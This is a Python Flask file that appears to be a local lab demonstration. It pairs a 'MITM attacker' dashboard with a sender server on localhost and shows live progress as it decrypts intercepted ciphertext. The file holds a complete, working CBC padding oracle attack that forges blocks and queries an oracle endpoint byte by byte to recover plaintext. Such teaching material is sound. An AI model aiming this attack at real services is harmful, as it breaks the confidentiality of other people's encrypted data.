#!/usr/bin/env python3
"""
MITM Attacker / Padding Oracle Attack Dashboard  (port 5001)

- Captures ciphertext sent from the sender server
- Performs CBC padding oracle attack by querying the sender's /oracle endpoint
- Streams decryption progress in real-time via SSE to a web dashboard
"""

import threading
import queue
import json
import time
from flask import Flask, request, jsonify, render_template_string, Response
import requests as http_req

app = Flask(__name__)

BLOCK_SIZE = 16
ORACLE_URL = "http://127.0.0.1:5000/oracle"

captured = []           # list of captured ciphertext hex strings
attack_log = {}         # ciphertext_hex -> attack state dict
sse_queues = []         # list of Queue objects for SSE clients
sse_lock = threading.Lock()


def broadcast(event_type, data):
    """Push an SSE event to all connected browser clients."""
    msg = json.dumps({"type": event_type, **data})
    with sse_lock:
        for q in sse_queues:
            try:
                q.put_nowait(msg)
            except queue.Full:
                pass


def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))


def split_blocks(data):
    return [data[i : i + BLOCK_SIZE] for i in range(0, len(data), BLOCK_SIZE)]


def oracle_query(two_blocks_hex):
    resp = http_req.post(ORACLE_URL, json={"ciphertext": two_blocks_hex}, timeout=5)
    return resp.json().get("valid", False)


def run_attack(ct_hex):
    """Run the full padding oracle attack in a background thread."""
    data = bytes.fromhex(ct_hex)
    blocks = split_blocks(data)
    total_ct = len(blocks) - 1
    queries = 0

    state = {
        "status": "running",
        "total_blocks": total_ct,
        "current_block": 0,
        "bytes_recovered": 0,
        "total_bytes": total_ct * BLOCK_SIZE,
        "plaintext_bytes": [],
        "plaintext": "",
        "queries": 0,
    }
    attack_log[ct_hex] = state

    broadcast("attack_start", {
        "ct": ct_hex,
        "total_blocks": total_ct,
        "total_bytes": total_ct * BLOCK_SIZE,
    })

    all_plain = b""

    for blk_idx in range(1, len(blocks)):
        prev = blocks[blk_idx - 1]
        target = blocks[blk_idx]
        intermediate = bytearray(BLOCK_SIZE)
        state["current_block"] = blk_idx

        broadcast("block_start", {"ct": ct_hex, "block": blk_idx, "of": total_ct})

        for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
            pad_val = BLOCK_SIZE - byte_pos
            crafted = bytearray(BLOCK_SIZE)

            for k in range(byte_pos + 1, BLOCK_SIZE):
                crafted[k] = intermediate[k] ^ pad_val

            found = False
            for guess in range(256):
                crafted[byte_pos] = guess
                forged_hex = (bytes(crafted) + target).hex()
                queries += 1

                if oracle_query(forged_hex):
                    if byte_pos == BLOCK_SIZE - 1:
                        check = bytearray(crafted)
                        check[byte_pos - 1] ^= 0x01
                        queries += 1
                        if not oracle_query((bytes(check) + target).hex()):
                            continue

                    intermediate[byte_pos] = guess ^ pad_val
                    pt_byte = prev[byte_pos] ^ intermediate[byte_pos]

                    state["bytes_recovered"] += 1
                    state["queries"] = queries
                    state["plaintext_bytes"].append(pt_byte)

                    broadcast("byte_found", {
                        "ct": ct_hex,
                        "block": blk_idx,
                        "pos": BLOCK_SIZE - byte_pos,
                        "byte": pt_byte,
                        "char": chr(pt_byte) if 32 <= pt_byte < 127 else ".",
                        "recovered": state["bytes_recovered"],
                        "total": state["total_bytes"],
                        "queries": queries,
                    })
                    found = True
                    break

            if not found:
                state["status"] = "error"
                broadcast("error", {"ct": ct_hex, "msg": f"Failed at block {blk_idx} byte {byte_pos}"})
                return

        pt_block = xor_bytes(prev, bytes(intermediate))
        all_plain += pt_block

    # Strip PKCS#7 padding
    try:
        pad_len = all_plain[-1]
        if 1 <= pad_len <= BLOCK_SIZE and all_plain[-pad_len:] == bytes([pad_len] * pad_len):
            all_plain = all_plain[:-pad_len]
    except Exception:
        pass

    try:
        plaintext_str = all_plain.decode()
    except UnicodeDecodeError:
        plaintext_str = all_plain.hex()

    state["status"] = "done"
    state["plaintext"] = plaintext_str
    state["queries"] = queries

    broadcast("attack_done", {
        "ct": ct_hex,
        "plaintext": plaintext_str,
        "queries": queries,
    })


PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>MITM Attacker Dashboard</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Segoe UI', system-ui, sans-serif;
    background: #0c0a09; color: #e7e5e4;
    min-height: 100vh; display: flex; justify-content: center; padding: 40px 20px;
  }
  .card {
    background: #1c1917; border-radius: 16px; padding: 40px;
    max-width: 750px; width: 100%; box-shadow: 0 8px 32px rgba(0,0,0,.5);
  }
  h1 { font-size: 1.6rem; color: #ef4444; margin-bottom: 4px; }
  .sub { color: #a8a29e; margin-bottom: 24px; font-size: .9rem; }
  .section { margin-bottom: 24px; }
  .section-title { color: #fbbf24; font-size: .85rem; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1px; }

  .captured-box {
    background: #0c0a09; border: 1px solid #292524; border-radius: 10px;
    padding: 16px; font-family: 'Courier New', monospace; font-size: .82rem;
    word-break: break-all; color: #fb923c; min-height: 48px;
  }
  .empty { color: #57534e; font-style: italic; }

  button {
    padding: 12px 28px; border: none; border-radius: 10px;
    background: #dc2626; color: #fff; font-size: 1rem; cursor: pointer;
    transition: background .2s;
  }
  button:hover { background: #b91c1c; }
  button:disabled { background: #44403c; cursor: not-allowed; }

  .progress-bar-outer {
    background: #292524; border-radius: 8px; height: 28px; margin: 16px 0;
    overflow: hidden; position: relative;
  }
  .progress-bar-inner {
    background: linear-gradient(90deg, #dc2626, #f97316);
    height: 100%; width: 0%; transition: width .15s; border-radius: 8px;
  }
  .progress-text {
    position: absolute; top: 0; left: 0; right: 0; height: 28px;
    display: flex; align-items: center; justify-content: center;
    font-size: .8rem; color: #fff; font-weight: 600;
  }

  .live-bytes {
    font-family: 'Courier New', monospace; font-size: 1.1rem;
    background: #0c0a09; border-radius: 10px; padding: 16px;
    border: 1px solid #292524; min-height: 48px;
    letter-spacing: 2px; line-height: 1.8;
  }
  .byte-known { color: #4ade80; }
  .byte-unknown { color: #44403c; }
  .byte-padding { color: #57534e; }

  .result-box {
    background: #052e16; border: 2px solid #22c55e; border-radius: 10px;
    padding: 20px; margin-top: 20px; display: none;
  }
  .result-box .label { color: #86efac; font-size: .8rem; margin-bottom: 6px; }
  .result-box .text { color: #4ade80; font-size: 1.3rem; font-weight: bold; }

  .stats { color: #a8a29e; font-size: .82rem; margin-top: 8px; }
</style>
</head>
<body>
<div class="card">
  <h1>MITM Attacker Dashboard</h1>
  <p class="sub">Intercepts encrypted traffic and decrypts it using the padding oracle vulnerability.</p>

  <div class="section">
    <div class="section-title">Captured Ciphertext</div>
    <div class="captured-box" id="captured">
      <span class="empty">Waiting for the sender to send a message...</span>
    </div>
  </div>

  <button id="attackBtn" onclick="startAttack()" disabled>Waiting for ciphertext...</button>

  <div class="section" id="progressSection" style="display:none; margin-top: 24px;">
    <div class="section-title">Decryption Progress</div>
    <div class="progress-bar-outer">
      <div class="progress-bar-inner" id="bar"></div>
      <div class="progress-text" id="barText">0%</div>
    </div>
    <div class="stats" id="stats"></div>
  </div>

  <div class="section" id="bytesSection" style="display:none; margin-top: 12px;">
    <div class="section-title">Recovered Bytes (real-time)</div>
    <div class="live-bytes" id="liveBytes"></div>
  </div>

  <div class="result-box" id="resultBox">
    <div class="label">DECRYPTED PLAINTEXT</div>
    <div class="text" id="resultText"></div>
    <div class="stats" id="resultStats"></div>
  </div>
</div>

<script>
let latestCt = null;
let totalBytes = 0;
let recoveredChars = [];

// Poll for new captures
setInterval(async () => {
  const r = await fetch('/captured');
  const d = await r.json();
  if (d.latest) {
    const el = document.getElementById('captured');
    el.textContent = d.latest;
    el.classList.remove('empty');
    if (latestCt !== d.latest) {
      latestCt = d.latest;
      const btn = document.getElementById('attackBtn');
      btn.disabled = false;
      btn.textContent = 'Start Padding Oracle Attack';
      document.getElementById('resultBox').style.display = 'none';
      document.getElementById('progressSection').style.display = 'none';
      document.getElementById('bytesSection').style.display = 'none';
    }
  }
}, 1000);

function startAttack() {
  if (!latestCt) return;
  const btn = document.getElementById('attackBtn');
  btn.disabled = true;
  btn.textContent = 'Attack running...';
  recoveredChars = [];
  document.getElementById('progressSection').style.display = 'block';
  document.getElementById('bytesSection').style.display = 'block';
  document.getElementById('resultBox').style.display = 'none';
  document.getElementById('bar').style.width = '0%';
  document.getElementById('barText').textContent = '0%';
  document.getElementById('liveBytes').innerHTML = '';
  document.getElementById('stats').textContent = '';

  fetch('/attack', { method: 'POST', headers: {'Content-Type':'application/json'},
                      body: JSON.stringify({ct: latestCt}) });

  const evtSource = new EventSource('/stream');
  evtSource.onmessage = function(e) {
    const d = JSON.parse(e.data);

    if (d.type === 'attack_start') {
      totalBytes = d.total_bytes;
      let dots = '';
      for (let i = 0; i < totalBytes; i++) dots += '<span class="byte-unknown">??</span> ';
      document.getElementById('liveBytes').innerHTML = dots;
    }

    if (d.type === 'byte_found') {
      recoveredChars.push({byte: d.byte, char: d.char});
      const pct = Math.round((d.recovered / d.total) * 100);
      document.getElementById('bar').style.width = pct + '%';
      document.getElementById('barText').textContent = pct + '% (' + d.recovered + '/' + d.total + ')';
      document.getElementById('stats').textContent = 'Oracle queries: ' + d.queries;

      // Update live bytes display
      const container = document.getElementById('liveBytes');
      let html = '';
      for (let i = 0; i < totalBytes; i++) {
        if (i < recoveredChars.length) {
          const c = recoveredChars[i];
          const hex = c.byte.toString(16).padStart(2, '0');
          html += '<span class="byte-known" title="' + c.char + '">' + hex + '</span> ';
        } else {
          html += '<span class="byte-unknown">??</span> ';
        }
      }
      container.innerHTML = html;
    }

    if (d.type === 'attack_done') {
      evtSource.close();
      document.getElementById('bar').style.width = '100%';
      document.getElementById('barText').textContent = '100%';
      document.getElementById('resultBox').style.display = 'block';
      document.getElementById('resultText').textContent = d.plaintext;
      document.getElementById('resultStats').textContent = 'Total oracle queries: ' + d.queries;
      const btn = document.getElementById('attackBtn');
      btn.disabled = false;
      btn.textContent = 'Attack again';
    }

    if (d.type === 'error') {
      evtSource.close();
      alert('Attack failed: ' + d.msg);
      document.getElementById('attackBtn').disabled = false;
      document.getElementById('attackBtn').textContent = 'Retry Attack';
    }
  };
}
</script>
</body>
</html>
"""


@app.route("/")
def index():
    return render_template_string(PAGE)


@app.route("/capture", methods=["POST"])
def capture():
    """Receives ciphertext forwarded from the sender server."""
    data = request.get_json(force=True)
    ct_hex = data.get("ciphertext", "")
    if ct_hex:
        captured.append(ct_hex)
        broadcast("captured", {"ct": ct_hex})
        print(f"  [CAPTURED] {ct_hex[:40]}...")
    return jsonify({"status": "ok"})


@app.route("/captured")
def get_captured():
    """Returns the latest captured ciphertext (for polling)."""
    if captured:
        return jsonify({"latest": captured[-1], "count": len(captured)})
    return jsonify({"latest": None, "count": 0})


@app.route("/attack", methods=["POST"])
def attack():
    """Start the padding oracle attack on a captured ciphertext."""
    data = request.get_json(force=True)
    ct_hex = data.get("ct", "")
    if not ct_hex:
        if captured:
            ct_hex = captured[-1]
        else:
            return jsonify({"error": "no ciphertext"}), 400

    t = threading.Thread(target=run_attack, args=(ct_hex,), daemon=True)
    t.start()
    return jsonify({"status": "started"})


@app.route("/stream")
def stream():
    """SSE endpoint: streams real-time attack progress to the browser."""
    q = queue.Queue(maxsize=2000)
    with sse_lock:
        sse_queues.append(q)

    def generate():
        try:
            while True:
                try:
                    msg = q.get(timeout=30)
                    yield f"data: {msg}\n\n"
                except queue.Empty:
                    yield ": keepalive\n\n"
        except GeneratorExit:
            pass
        finally:
            with sse_lock:
                if q in sse_queues:
                    sse_queues.remove(q)

    return Response(generate(), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


@app.route("/status")
def status():
    """Returns the current attack state (for programmatic testing)."""
    if not attack_log:
        return jsonify({"status": "idle"})
    latest_key = list(attack_log.keys())[-1]
    return jsonify(attack_log[latest_key])


if __name__ == "__main__":
    print("\n  Attacker Dashboard running on http://127.0.0.1:5001")
    print("  Waiting to capture ciphertext from the sender...\n")
    app.run(host="127.0.0.1", port=5001, threaded=True)
